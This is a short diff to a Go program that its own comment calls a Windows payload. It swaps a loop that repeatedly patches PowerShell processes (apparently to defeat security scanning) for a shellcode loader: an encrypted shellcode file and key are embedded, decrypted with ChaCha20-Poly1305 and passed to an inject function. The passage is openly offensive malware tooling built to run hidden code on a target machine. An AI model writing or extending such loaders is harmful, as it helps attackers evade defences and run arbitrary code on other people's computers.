@@ -3,17 +3,27 @@
 package main
 
 import (
-	"time"
+	_ "embed"
 
 	"golang.org/x/crypto/chacha20poly1305"
 )
 
+// Encrypted binary for shellcode to run (use linux command to generate file)
+//
+//go:embed shell.bin
+var shellcode []byte
+
+//go:embed shell.key
+var key []byte
+
 // Main function for handling the actual windows payload
 func main() {
-	for {
-		PatchAllPowershells("powershell.exe")
-		time.Sleep(ptchdrq * time.Millisecond)
+	decrypted, err := decryptShellcode(shellcode, key)
+	if err != nil {
+		panic(err)
 	}
+
+	inject(decrypted)
 }
 
 func decryptShellcode(buf []byte, key []byte) (plaintext []byte, err error) {
